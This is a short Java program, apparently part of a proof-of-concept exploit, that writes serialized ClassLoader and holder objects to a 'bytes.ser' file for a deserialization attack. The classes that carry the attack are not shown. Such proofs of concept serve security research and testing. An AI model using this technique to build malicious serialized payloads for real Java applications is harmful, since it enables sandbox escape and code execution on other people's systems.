package x;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

import x.ClassLoaderHolder;
import x.SerializableClassLoader;

/**
 * Create some special bytes to deserialize
 */
public class SerializedDataCreator {

    public static void main(String[] args) throws Exception {
        File f = new File("src-exploit/x/bytes.ser");
        FileOutputStream fout = new FileOutputStream(f);
        ObjectOutputStream out = new ObjectOutputStream(fout);
        SerializableClassLoader evt = new SerializableClassLoader();
        ClassLoaderHolder holder = new ClassLoaderHolder(null); // Must not ref evt which fails to load!

        SerializableClassLoader evt2 = new SerializableClassLoader();
        ClassLoaderHolder holder2 = new ClassLoaderHolder(evt2);
        Object[] vals = new Object[] { evt2, holder2 };
        out.writeObject(evt);
        out.flush();
        out.writeObject(holder);
        out.flush();
        out.writeObject(vals);
        out.flush();
        out.close();
    }

}
